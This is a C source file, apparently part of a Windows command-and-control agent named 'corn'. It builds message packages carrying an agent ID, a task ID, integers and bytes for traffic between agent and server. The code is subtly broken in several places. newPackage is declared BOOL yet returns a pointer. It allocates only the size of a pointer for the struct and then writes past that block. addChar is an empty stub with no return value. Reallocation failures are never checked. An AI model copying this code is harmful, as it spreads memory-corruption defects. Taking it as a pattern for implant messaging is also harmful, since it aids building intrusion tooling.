#include <windows.h>
#include <string.h>
#include "../include/package.h"
#include "../include/corn.h"
#include "parser.h"
//UUIDは36バイト固定
BOOL addUUID(PPackage package, PCHAR uuid){
    package->buffer = LocalReAlloc(package->buffer, package->length + 36, LMEM_MOVEABLE | LMEM_ZEROINIT);

    memcpy((PUCHAR)(package->buffer) + package->length, uuid, 36);
    package->length += 36;

    return TRUE;
}


BOOL addChar(){

}

// UINT32
BOOL addUINT32ToBuffer(PUCHAR TargetAddr, UINT32 value) {
    if (TargetAddr == NULL) return FALSE;
    memcpy(TargetAddr, &value, sizeof(UINT32));
    return TRUE;
}

BOOL addUInt32(PPackage package, UINT32 value){
    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(UINT32), LMEM_MOVEABLE | LMEM_ZEROINIT);
    addUINT32ToBuffer((PUCHAR)(package->buffer) + package->length, value);
    package->length += sizeof(UINT32); //update buffer length

    return TRUE;
}

// BYTE
BOOL addBYTEToBuffer(PUCHAR TargetAddr, BYTE value) {
    if (TargetAddr == NULL) return FALSE;
    memcpy(TargetAddr, &value, sizeof(BYTE));
    return TRUE;
}

BOOL addByte(PPackage package, BYTE value){
    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(BYTE), LMEM_MOVEABLE | LMEM_ZEROINIT);
    addBYTEToBuffer((PUCHAR)(package->buffer) + package->length, value);
    package->length += sizeof(BYTE); //update buffer length

    return TRUE;
}


// TODO:addInt32以外の型を追加する。

//initはagentUUIDとtaskUUIDを含めるかどうか(TRUEだと含める)
BOOL newPackage(BYTE taskUUID, BOOL init){
    // 構造体のメモリを確保
    PPackage Package = (PPackage)LocalAlloc(LPTR, sizeof(Package));

    if (!Package){
        return NULL;
    }

    // bufferのメモリを確保
    Package->buffer = (PVOID)LocalAlloc(LPTR, sizeof(BYTE));

    if (!Package->buffer){
        return NULL;
    }

    Package->length = 0;

    if(init){
        addUUID(Package, corn_config.AgentID);
        addByte(Package, taskUUID);
    }

    return Package;
}

VOID freePackage(PPackage package){
    LocalFree(package->buffer);
    LocalFree(package);
}